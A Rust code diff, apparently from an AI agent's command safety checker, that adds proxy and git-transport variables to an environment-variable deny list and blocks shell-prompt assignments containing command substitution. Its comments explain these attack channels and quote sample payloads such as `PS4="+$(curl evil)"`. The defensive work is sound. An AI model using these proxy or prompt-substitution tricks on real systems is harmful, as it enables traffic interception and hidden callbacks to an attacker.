@@ -96,6 +96,16 @@ pub(crate) const DENIED_ENV_VARS: &[&str] = &[
     "PIP_EXTRA_INDEX_URL",
     "VIRTUAL_ENV",
     "CONDA_PREFIX",
+    // Proxy/git-transport/prompt-expansion channels (wave-46):
+    // HTTP(S)_PROXY/ALL_PROXY route every request through the attacker
+    // (MITM by configuration, the CA-bundle twins); GIT_PROXY_COMMAND
+    // pipes git traffic through a chosen binary; PS1/PS2/PS4 undergo
+    // command substitution on every prompt — `PS4="+$(curl evil)"` is a
+    // callback on every xtrace line (PROMPT_COMMAND's twin).
+    "HTTP_PROXY",
+    "HTTPS_PROXY",
+    "ALL_PROXY",
+    "GIT_PROXY_COMMAND",
     // Git execution vectors: agent git work goes through the git tools, not
     // env-injected helpers.
     "GIT_SSH_COMMAND",
@@ -952,6 +962,19 @@ impl SafetyChecker {
             LazyLock::new(|| Regex::new(r"\bexport\s+\$\w+\s*=").expect("Invalid regex"));
         for part in split_shell_commands(&normalized) {
             if INDIRECT_EXPORT.is_match(part.trim()) {
+                return Err(SelfwareError::Safety(SafetyError::BlockedEnvInjection));
+            }
+        }
+
+        // PS1/PS2/PS4 assignments are everyday theming — but the prompt
+        // vars undergo command substitution on every print, so a value
+        // containing $(…) or backticks is a callback channel (wave-46:
+        // `PS4="+$(id)"`). Refuse substitution-bearing values only.
+        static PS_SUBST_ASSIGNMENT: LazyLock<Regex> = LazyLock::new(|| {
+            Regex::new(r"(?i)\b(ps1|ps2|ps4)\s*=\s*[^;&|]*(\$\(|`)").expect("Invalid regex")
+        });
+        for part in split_shell_commands(&normalized) {
+            if PS_SUBST_ASSIGNMENT.is_match(part.trim()) {
                 return Err(SelfwareError::Safety(SafetyError::BlockedEnvInjection));
             }
         }
